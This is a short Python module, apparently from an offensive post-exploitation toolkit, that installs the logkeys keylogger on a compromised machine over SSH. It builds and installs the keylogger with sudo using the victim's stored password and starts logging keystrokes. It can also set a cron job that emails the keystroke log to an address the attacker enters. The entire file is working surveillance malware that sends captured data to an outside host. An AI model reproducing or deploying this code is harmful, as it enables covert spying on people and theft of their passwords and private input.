from module import *
import os
import time

class Keylogger(Module):

    def __init__(self, target, command, core):
        self.core = core
        self.target = target
        self.name = "Keylogger"
        self.command = command
        self.options = {
		}

    def exploit(self, command):
        os.system('git clone https://github.com/kernc/logkeys')
	self.target.scpFiles(self, 'logkeys', True)
	self.target.ssh.exec_command("./logkeys/configure")
	time.sleep(10)
	print("Configuring...")
	self.target.ssh.exec_command("make logkeys")
	time.sleep(10)
	print("Making...")
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S make install logkeys")
	print("Installing...")
	time.sleep(10)
	self.target.ssh.exec_command("touch log.log")
	time.sleep(1)
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")

	print("Starting...")
	
	if (raw_input("Press y to have the file sent to you through email ") == 'y'):
	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install sendmail")
	    self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S apt-get install mailutils")
	    self.target.ssh.exec_command("crontab -l > mycron")
	    self.target.ssh.exec_command("echo 'echo report | mail -A ~/log.log " + raw_input("Please input your email address ") + "' > script.sh")
	    self.target.ssh.exec_command("echo \"* * * * 0 echo password | sudo -S bash ~/script.sh\" >> mycron && crontab mycron && rm mycron")
            print("You will recieve an email(probably in spam) with your new keylogger report every hour.")
	print(GOOD + self.name + " module success")
